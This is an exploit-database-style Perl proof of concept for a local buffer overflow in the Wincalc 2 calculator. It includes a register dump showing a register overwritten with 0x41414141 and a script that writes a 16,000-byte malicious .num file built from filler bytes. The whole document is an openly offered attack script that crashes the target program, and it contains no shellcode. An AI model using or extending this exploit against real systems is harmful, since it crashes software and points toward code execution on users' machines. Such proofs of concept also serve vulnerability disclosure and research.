#!/usr/bin/perl
###################################################################
#Exploit Title : Wincalc 2 (.num) local Buffer Overflow Poc
#tested on windows xp SP 3 FR
#Author: MadjiX - Dz8[at]HotmaiL[dot]CoM
#download: http://math.exeter.edu/rparris/peanut/wcru32z.exe
#Special Greets:Bibi-info , His0k4 [ where are you :( ]
###################################################################
#EAX 00000001
#ECX 41414141
#EDX 00000000
#EBX 0046EE18
#ESP 0012F868
#EBP 0012F8AC
#ESI 009A2DC0
#EDI 0000003B
#EIP 00417A74 wcalcru.00417A74
#C 0 ES 0023 32bit 0(FFFFFFFF)
#P 0 CS 001B 32bit 0(FFFFFFFF)
#A 0 SS 0023 32bit 0(FFFFFFFF)
#Z 0 DS 0023 32bit 0(FFFFFFFF)
#S 0 FS 003B 32bit 7FFDD000(FFF)
###################################################################
my $file = "MadjiX.NUM";
my $junk1 = "\x41" x 2000 ;
my $junk2 = "\x42" x 2000 ;
my $junk3 = "\x43" x 2000 ;
my $junk4 = "\x44" x 2000 ;
my $junk5 = "\x45" x 2000 ;
my $junk6 = "\x46" x 2000 ;
my $junk7 = "\x47" x 2000 ;
my $junk8 = "\x48" x 2000 ;
open($FILE,">$file");
print $FILE $junk1.$junk2.$junk3.$junk4.$junk5.$junk6.$junk7.$junk8;
close($FILE);